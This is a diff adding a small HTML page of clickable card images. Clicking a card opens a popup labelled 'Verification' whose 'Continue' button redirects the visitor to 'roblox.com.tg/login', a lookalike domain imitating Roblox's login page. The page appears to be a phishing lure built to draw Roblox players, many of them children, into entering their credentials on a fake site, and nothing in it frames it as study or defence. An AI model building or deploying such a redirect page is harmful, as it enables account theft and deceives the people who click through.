@@ -1,0 +1,104 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Card Popup Redirect</title>
+    <style>
+        body {
+            background: #1f0036;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: white;
+        }
+        .container {
+            display: flex;
+            gap: 20px;
+            padding: 20px;
+        }
+        .card {
+            background: #2b0055;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 0 20px #9400ff77;
+            transition: transform 0.2s;
+            cursor: pointer;
+        }
+        .card:hover {
+            transform: scale(1.05);
+        }
+        .card img {
+            width: 200px;
+            height: 250px;
+            object-fit: cover;
+            display: block;
+        }
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+        .popup-content {
+            background: #30004d;
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 0 20px #ff00d477;
+        }
+        .popup-content h2 {
+            margin-bottom: 20px;
+        }
+        .popup-content button {
+            background: #ff00d4;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        .popup-content button:hover {
+            background: #ff66e0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card" onclick="openPopup()"><img src="card1.png" alt="Card 1"></div>
+        <div class="card" onclick="openPopup()"><img src="card2.png" alt="Card 2"></div>
+        <div class="card" onclick="openPopup()"><img src="card3.png" alt="Card 3"></div>
+    </div>
+
+    <div class="popup" id="popup">
+        <div class="popup-content">
+            <h2>Verification</h2>
+            <button onclick="redirectUser()">Continue</button>
+        </div>
+    </div>
+
+    <script>
+        function openPopup() {
+            document.getElementById('popup').style.display = 'flex';
+        }
+
+        function redirectUser() {
+            window.location.href = "https://www.roblox.com.tg/login?returnUrl=0985487680804075";
+        }
+
+        // Allow closing popup by clicking outside
+        document.getElementById('popup').addEventListener('click', function(e) {
+            if (e.target === this) this.style.display = 'none';
+        });
+    </script>
+</body>
+</html>
